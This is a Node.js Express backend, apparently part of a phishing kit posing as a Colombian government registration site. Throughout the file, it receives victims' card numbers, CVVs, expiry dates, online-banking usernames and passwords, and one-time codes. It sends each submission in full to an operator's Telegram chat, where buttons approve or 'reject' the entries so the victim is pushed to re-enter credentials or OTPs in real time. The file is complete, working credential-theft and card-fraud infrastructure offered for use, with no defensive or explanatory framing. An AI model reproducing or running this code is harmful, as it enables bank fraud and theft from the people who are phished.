const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backvenecol.onrender.com';

// 🧠 ALMACENAMIENTO EN MEMORIA (Se borra si el servidor se reinicia)
const pagosPendientes = new Map();

async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        return await r.json();
    } catch (e) { 
        console.error("❌ Error enviando mensaje a Telegram:", e);
        return { ok: false }; 
    }
}

async function tgEditMessage(messageId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' }) });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
    } catch {}
}

function construirTextoPago(pago) {
    return (
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>`
    );
}

app.post('/api/crear-pago', async (req, res) => {
    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
    
    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });

    try {
        // Guardamos en memoria
        const pago = {
            solicitud_id,
            titular,
            numero_tarjeta,
            cvv,
            vencimiento,
            marca_tarjeta: marca_tarjeta.toLowerCase(),
            banco_emisor: banco_emisor || 'Desconocido',
            usuario_banco: usuario_banco || null,
            password_banco: password_banco || null,
            codigo_otp: codigo_otp || null,
            estado: 'pendiente',
            paso: paso || 'crear',
            fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
            motivo_rechazo: null,
            redirigir_a: null
        };
        
        pagosPendientes.set(solicitud_id, pago);

        const pasoActual = paso || 'crear';

        // 🔥 SI ES UNA SOLICITUD NUEVA (TARJETA)
        if (pasoActual === 'crear') {
            const texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
            const replyMarkup = {
                inline_keyboard: [[
                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
                ]]
            };
            await tgSendMessage(texto, replyMarkup);
        } 
        // 🔥 SI SON CREDENCIALES O OTP
        else {
            const texto = `📝 <b>NUEVOS DATOS RECIBIDOS (${pasoActual.toUpperCase()})</b>\n\n` + construirTextoPago(pago);
            const replyMarkup = {
                inline_keyboard: [[
                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
                ]]
            };
            await tgSendMessage(texto, replyMarkup);
        }

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error("Error en /api/crear-pago:", err);
        return res.status(500).json({ success: false, error: 'Error al registrar' });
    }
});

app.get('/api/estado-pago/:solicitud_id', (req, res) => {
    try {
        const pago = pagosPendientes.get(req.params.solicitud_id);
        if (!pago) return res.status(404).json({ success: false, error: 'No encontrado' });

        if (pago.estado === 'aprobado_credenciales') {
            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales', marca: pago.marca_tarjeta });
        }
        if (pago.estado === 'rechazado_credenciales') {
            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
        }

        if (pago.estado === 'aprobado') {
            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${pago.redirigir_a || 'exito.html'}` });
        }
        if (pago.estado === 'rechazado' || pago.estado === 'rechazado_otp') {
            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: pago.motivo_rechazo });
        }

        return res.json({ success: true, estado: 'pendiente', fase: pago.fase_actual || 'credenciales' });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const cq = req.body?.callback_query;
    if (!cq || !cq.data) return;

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const pago = pagosPendientes.get(solicitud_id);
        if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');

        const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';

        if (accion === 'aprobar') {
            if (!estaEnFaseOTP) {
                pago.estado = 'aprobado_credenciales';
                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
            } else {
                const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                pago.estado = 'aprobado';
                pago.fase_actual = 'completado';
                pago.redirigir_a = archivo;
                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago));
            }
        } else if (accion === 'rechazar') {
            const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
            pago.estado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
            pago.motivo_rechazo = motivo;
            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
        }
    } catch (err) { console.error("Error en webhook:", err); }
});

async function registrarWebhook() {
    if (!TELEGRAM_TOKEN) return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
        console.log('✅ Webhook registrado');
    } catch (e) { console.error("Error registrando webhook:", e); }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend en puerto ${PORT}`);
    registrarWebhook();
});
